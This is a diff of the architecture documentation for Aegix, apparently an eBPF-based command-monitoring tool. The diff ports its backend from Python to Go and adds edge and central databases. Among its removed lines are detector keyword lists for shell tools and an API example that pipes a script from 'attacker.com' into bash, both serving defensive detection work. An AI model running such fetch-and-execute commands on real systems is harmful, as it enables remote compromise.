@@ -10,40 +10,37 @@ Aegix is a **four-layer real-time RCE prevention system** that combines an alway
 
 ```
 ┌─────────────────────────────────────────────────────────────┐
-│  Layer 3: Dashboard (Visualization & Alerting)             │
+│  Layer 4: Dashboard (Visualization & Alerting)             │
 │  - React web UI                                            │
-│    * Local: http://localhost:5173                          │
-│    * HF Space: https://huggingface.co/spaces/Raphel3116/... │
+│    * Proxy: NGINX routes / to frontend, /api to backend    │
 │  - Real-time event feed via WebSocket                      │
 │  - Risk visualization & attack analysis                    │
 └──────────────────────┬──────────────────────────────────────┘
-                       │ WebSocket
+                       │ WebSocket / HTTP
                        ▼
 ┌─────────────────────────────────────────────────────────────┐
-│  Layer 2: Aegix (Intelligence & Decision)                 │
-│  - Rule Engine (60% weight)                                │
-│    * Pattern matching (injection, shells, reverse shells)  │
-│    * Keyword detection (curl, wget, bash, etc.)            │
-│    * Encoded payload detection (base64, hex)               │
-│  - ML Scorer (40% weight)                                  │
-│    * Logistic Regression on TF-IDF features               │
-│  - Combined risk score (0-100)                             │
+│  Layer 3: Aegix API & Intelligence (The Brain)             │
+│  - Golang Backend (Chi Router)                             │
+│  - PostgreSQL (Cold Storage for users, alerts, settings)   │
+│  - OAuth Authentication (Google/GitHub, JWT Sessions)      │
+│  - Rule Engine & ML Scorer (Threat Detection)              │
 │  - Classification (safe/suspicious/malicious)             │
+└──────────────────────┬──────────────────────────────────────┘
+                       │ High-speed local sync
+                       ▼
+┌─────────────────────────────────────────────────────────────┐
+│  Layer 2: Edge Sync Agent (The Cache)                      │
+│  - High-speed SQLite DB running locally on the edge node   │
+│  - Caches eBPF events before pushing to PostgreSQL         │
+│  - Ensures zero data loss during network interruptions     │
 └──────────────────────┬──────────────────────────────────────┘
                        │
 ┌─────────────────────────────────────────────────────────────┐
-│  Layer 1: Aegix (Enforcement)                              │
+│  Layer 1: Aegix Enforcement (The Muscle)                   │
 │  - eBPF tracepoint hook on execve syscall                  │
 │  - Captures: pid, ppid, uid, command, args                 │
 │  - Streams events to user space via ring buffer            │
 │  - Graceful fallback on Windows/WSL2                       │
-└─────────────────────────────────────────────────────────────┘
-                       │
-┌─────────────────────────────────────────────────────────────┐
-│  Layer 4: Agent Runtime (Always On)                        │
-│  - Starts the backend as a background service              │
-│  - Detects Linux vs macOS vs Windows capability            │
-│  - Runs kernel mode on Linux and API-only mode elsewhere   │
 └─────────────────────────────────────────────────────────────┘
 ```
 
@@ -59,45 +56,35 @@ Hosted demos:
 ```
 User/Process attempts execution
        ↓
-Agent runtime keeps backend alive
-   ↓
 Aegix (eBPF) intercepts execve (Linux only)
        ↓
-Ring buffer → User space (Python)
+Ring buffer → User space (Go runtime)
+       ↓
+Event stored in local Edge SQLite DB (high-speed write)
        ↓
 Detection Pipeline receives event
        ↓
-Psutil enriches event with process RSS memory & system RAM%
-       ↓
-Rule Engine + ML Scorer analyze command + memory metrics
+Rule Engine + ML Scorer analyze command
        ↓
 Risk score calculated (0-100)
        ↓
-Classification: safe / suspicious / malicious
-       ↓
-Event stored in memory buffer (and later persistence layer)
+Event synced to PostgreSQL (Central Cold Store)
        ↓
 WebSocket broadcasts to all connected clients
        ↓
 Dashboard updates in real-time
 ```
 
-### 3. Agent Startup Path
-
-The agent/runtime is the first process the user starts. It determines whether the machine can run kernel mode or must remain API-only.
-
-- **Linux**: runs in kernel mode and starts the backend in always-on monitoring mode.
-- **Windows**: runs in API-only mode.
-- **macOS**: runs in API-only mode until a native collector exists.
-
 ### 2. API Command Analysis Path
 
 ```
-curl -X POST /analyze {"command":"..."}
+curl -X POST /api/analyze {"command":"..."}
        ↓
-FastAPI endpoint receives request
+NGINX Proxy forwards request to Go Backend (Port 8000)
        ↓
-Detection Pipeline.detect(command)
+Go Chi Router Endpoint receives request
+       ↓
+Detection Pipeline.Detect(command)
        ↓
 Rule Engine + ML Scorer process
        ↓
@@ -110,68 +97,35 @@ Client receives JSON response
 
 ## Component Details
 
-### Layer 1: Aegix (eBPF)
+### Layer 1 & 2: Edge Sync Agent & Kernel Guard
 
-**File**: `kernel/execve_hook.c`, `backend/kernel/rce_monitor.py`
+**File**: `backend/internal/store/sync_agent.go`, `backend/kernel/rce_monitor.go` (Roadmap)
 
-**Responsibility**: Monitor system calls at kernel level
+**Responsibility**: Monitor system calls at kernel level and cache events locally before syncing to the cloud.
 
 **Key Features**:
-- Hooks `tracepoint/syscalls/sys_enter_execve` (kernel 5.4+)
+- High-speed local SQLite database (`data/.aegix_edge.db`) ensures zero event loss even if the central PostgreSQL server is unreachable.
+- Hooks `tracepoint/syscalls/sys_enter_execve` (kernel 5.4+) via eBPF (currently Python BCC, migrating to Cilium eBPF in Go).
 - Zero-copy event streaming via BPF ring buffer
 - Captures with minimal overhead (<1% CPU)
-- Requires: `CAP_BPF` or root privilege
-
-**Event Captured**:
-```c
-struct execve_event {
-    u32 pid;           // Process ID
-    u32 ppid;          // Parent process ID
-    u32 uid;           // User ID
-    u32 gid;           // Group ID
-    char comm[16];     // Process name
-    char argv[4096];   // Full command line
-    u64 timestamp;     // Kernel timestamp
-}
-```
-
-**Status**: Phase 2 (Completed ✅)
 
 **Implementation Details**:
-- **Language**: eBPF (C) + Python/BCC
-- **Hook Type**: `tracepoint/syscalls/sys_enter_execve` (kernel 5.4+)
+- **Language**: Go (Edge Agent) + eBPF (Kernel hook)
+- **Local Cache**: SQLite with WAL mode enabled for maximum concurrency.
+- **Sync Strategy**: Background goroutine polls local SQLite and pushes batches to the central PostgreSQL database.
 - **Data Transport**: BPF ring buffer (zero-copy, lock-free)
-- **User Space Loader**: BCC (Berkeley Packet Filter Compiler Collection)
-- **Threading**: Background thread polls ring buffer every 100ms
 - **Overhead**: <1% CPU on idle systems
-- **Privileges Required**: `CAP_BPF` or root
 
-**Key Files**:
-- `kernel/execve_hook.c` - eBPF tracepoint hook (~120 lines)
-- `kernel/Makefile` - Compilation pipeline (clang → llvm → eBPF .o)
-- `backend/kernel/rce_monitor.py` - BCC loader + ring buffer poller
-
-**How It Works**:
-1. eBPF program hooks `sys_enter_execve` tracepoint in kernel
-2. On each exec attempt, allocates event from ring buffer
-3. Captures PID, PPID, UID, GID, command, args (all with minimal overhead)
-4. Submits to ring buffer (non-blocking, zero-copy)
-5. Python background thread polls ring buffer (100ms timeout)
-6. Converts binary events to `ExecveEvent` objects
-7. **Python immediately samples `psutil.Process(pid).memory_info().rss`** and `psutil.virtual_memory().percent` — this is the Memory Profiling layer enrichment
-8. Passes enriched event to Aegix detection pipeline (Layer 2)
-9. Stores and broadcasts the resulting `SecurityEvent` to the dashboard
-
-### Layer 2: Aegix (Detection Pipeline)
+### Layer 3: Aegix API (Detection Pipeline)
 
 **Files**: 
-- `backend/detection/rule_engine.py` - Pattern matching
-- `backend/detection/ml_scorer.py` - ML inference
-- `backend/detection/pipeline.py` - Orchestration
+- `backend/internal/detector/rule_engine.go` - Pattern matching
+- `backend/internal/detector/ml_scorer.go` - ML inference placeholder
+- `backend/internal/detector/pipeline.go` - Orchestration
 
 **Responsibility**: Analyze commands and determine threat level
 
-#### Sub-Layer 2A: Rule Engine (60% weight)
+#### Sub-Layer 3A: Rule Engine (60% weight)
 
 Pattern-based detection for common RCE attacks:
 
@@ -208,12 +162,12 @@ Machine learning classification using scikit-learn:
 - Balanced class weights (prevents safe-class bias)
 
 **Code Example**:
-```python
-ml_score, confidence = ml_scorer.score_ml(command)
-# Returns: (85.3, 0.92) - 85.3/100 malicious probability, 92% confidence
+```go
+mlScore, confidence := mlScorer.ScoreML(command)
+// Returns: (85.3, 0.92) - 85.3/100 malicious probability, 92% confidence
 ```
 
-#### Sub-Layer 2C: Memory Profiler (post-ring-buffer)
+#### Sub-Layer 3C: Memory Profiler (post-ring-buffer)
 
 The Memory Profiling layer runs **after** the eBPF event surfaces from the kernel ring buffer, before the command enters the detection pipeline.
 
@@ -222,19 +176,20 @@ The Memory Profiling layer runs **after** the eBPF event surfaces from the kerne
 - `task_mem_info()` requires CO-RE BTF type information not available on all kernel versions.
 - Short-lived processes (e.g. `ls`) exit before the ring buffer is flushed — making in-kernel sampling unreliable.
 
-**Implementation** (`backend/agent/main.py` + `backend/app.py`):
-```python
-# Runs immediately when the event exits the ring buffer (T=0)
-try:
-    proc = psutil.Process(execve_event.pid)
-    process_memory_mb = proc.memory_info().rss / (1024 * 1024)  # bytes → MB
-except (psutil.NoSuchProcess, psutil.AccessDenied):
-    process_memory_mb = 0.0   # Process already exited — default to 0
-
-system_memory_percent = psutil.virtual_memory().percent
+**Implementation** (`backend/internal/store/sync_agent.go`):
+```go
+// Runs immediately when the event exits the ring buffer (T=0)
+proc, err := process.NewProcess(int32(execveEvent.PID))
+var processMemoryMB float64
+if err == nil {
+    memInfo, err := proc.MemoryInfo()
+    if err == nil {
+        processMemoryMB = float64(memInfo.RSS) / (1024 * 1024)
+    }
+}
 ```
 
-**Scoring Rules** (`backend/detection/rule_engine.py`):
+**Scoring Rules** (`backend/internal/detector/rule_engine.go`):
 
 | Condition | Rule Name | Penalty |
 |---|---|---|
@@ -247,21 +202,23 @@ system_memory_percent = psutil.virtual_memory().percent
 
 **Dashboard**: Both metrics are displayed in the Live Events Table (`Mem MB` and `RAM %` columns) and the Latest Detection card. Values exceeding thresholds are highlighted in red/amber.
 
-#### Sub-Layer 2D: Combined Scoring
+#### Sub-Layer 3D: Combined Scoring
 
-```python
-risk_score = 0.6 * rule_score + 0.4 * ml_score
+```go
+riskScore := 0.6 * ruleScore + 0.4 * mlScore
 
-# Classification thresholds:
-if risk_score < 30:
-    classification = "safe"           # Allow execution
-elif risk_score < 70:
-    classification = "suspicious"     # Log & allow
-else:
-    classification = "malicious"      # Block & alert
+// Classification thresholds:
+var classification string
+if riskScore < 30 {
+    classification = "safe"           // Allow execution
+} else if riskScore < 70 {
+    classification = "suspicious"     // Log & allow
+} else {
+    classification = "malicious"      // Block & alert
+}
 ```
 
-### Layer 3: Dashboard (Visualization)
+### Layer 4: Dashboard (Visualization)
 
 **Files**: `frontend/src/` (React + TypeScript)
 
@@ -287,11 +244,12 @@ else:
 
 ### Layer 4: Agent Runtime (Always On)
 
-**Files**: `backend/agent/runtime.py`, `backend/agent/bridge.py`, `scripts/run_agent.sh`, `scripts/run_agent.ps1`
+**Files**: `backend/cmd/aegix/main.go`
 
 **Responsibility**: Start the backend and choose the correct runtime mode for the host OS
 
 **Key Features**:
+- Written in Go for zero-dependency deployment
 - Detects Linux, macOS, Windows, or unsupported platforms
 - Uses kernel mode on Linux
 - Uses API-only mode on macOS and Windows
@@ -301,92 +259,7 @@ else:
 
 ## API Reference
 
-### Health Check
-
-```http
-GET /
-```
-
-**Response**:
-```json
-{
-  "status": "online",
-  "name": "Aegix Security",
-  "version": "0.1.0",
-  "events_stored": 42
-}
-```
-
-### Analyze Command
-
-```http
-POST /analyze
-Content-Type: application/json
-
-{
-  "command": "curl http://attacker.com/script.sh | bash"
-}
-```
-
-**Response**:
-```json
-{
-  "command": "curl http://attacker.com/script.sh | bash",
-  "classification": "malicious",
-  "risk_score": 85.2,
-  "matched_rules": ["shell_piping"],
-  "ml_confidence": 0.92,
-  "explanation": "🚨 Command is likely malicious... | Risk Score: 85.2/100 | ..."
-}
-```
-
-### Get Events
-
-```http
-GET /events?limit=100
-```
-
-**Response**: Array of SecurityEvent objects
-
-### Get Statistics
-
-```http
-GET /stats
-```
-
-**Response**:
-```json
-{
-  "total_events": 150,
-  "safe": 120,
-  "suspicious": 20,
-  "malicious": 10
-}
-```
-
-### WebSocket Events
-
-```
-ws://localhost:8000/ws
-```
-
-**Message Format**:
-```json
-{
-  "id": "evt_a1b2c3d4",
-  "pid": 1234,
-  "ppid": 1200,
-  "uid": 1000,
-  "command": "ls -la",
-  "argv_str": "ls -la",
-  "timestamp": 1699500000.123,
-  "classification": "safe",
-  "risk_score": 10.5,
-  "matched_rules": [],
-  "ml_confidence": 0.05,
-  "explanation": "..."
-}
-```
+(Moved to `API.md`)
 
 ---
 
@@ -439,7 +312,7 @@ ws://localhost:8000/ws
 - **Accuracy**: 100% on known patterns
 
 ### ML Scorer
-- **Time**: ~2-5ms per command (TF-IDF + prediction)
+- **Time**: ~2-5ms per command (Go inference)
 - **Memory**: ~2MB model size
 - **Accuracy**: ~90% on test set
 
@@ -505,26 +378,30 @@ ws://localhost:8000/ws
 - SQLite Database (`data/events.db`)
 - In-memory LRU cache
 
-### Phase 6b: Alerting & Webhooks ✅
+### Phase 7: Alerting & Webhooks ✅
 - Configurable webhooks (Slack, Discord)
 - Alert history tracking
 
-### Phase 7: Auto-Remediation ✅
+### Phase 8: Auto-Remediation & Advanced Dashboard ✅
 - Kill processes based on classification
-- Quarantine remains a future extension
-
-### Phase 8: Advanced Dashboard & Routing ✅
 - Dynamic AI sensitivity threshold tuning
 - Targeted webhook tagging (Safe/Suspicious/Malicious)
 - Cyberpunk styled UI with real-time stats
+
+### Phase 9: Enterprise Architecture (The Go Rewrite) ✅
+- Ported backend from Python/FastAPI to Go/Chi for high performance
+- Dual-Database Architecture: PostgreSQL (Central) + SQLite (Edge Sync)
+- NGINX Reverse Proxy for unified routing
+- Google and GitHub OAuth Authentication with secure HTTP-only JWT cookies
 
 ---
 
 ## Future Enhancements
 
-1. **LLM Reasoning**: Add GPT/Ollama layer for complex interpretation
+1. **LLM Reasoning**: Add native Go-based inference for complex interpretation
 2. **Cross-Platform**: Windows ETW, Mac DTrace backends
-3. **Scaling**: Postgres + Redis for large-scale deployments
+3. **Swagger Integration**: Add interactive API documentation via swaggo
+4. **Native Go eBPF**: Port BCC Python loader to Cilium eBPF in Go
 
 ---
 
